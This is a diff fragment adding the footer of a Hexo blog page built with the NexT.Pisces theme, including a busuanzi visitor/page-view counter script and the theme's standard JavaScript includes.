+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
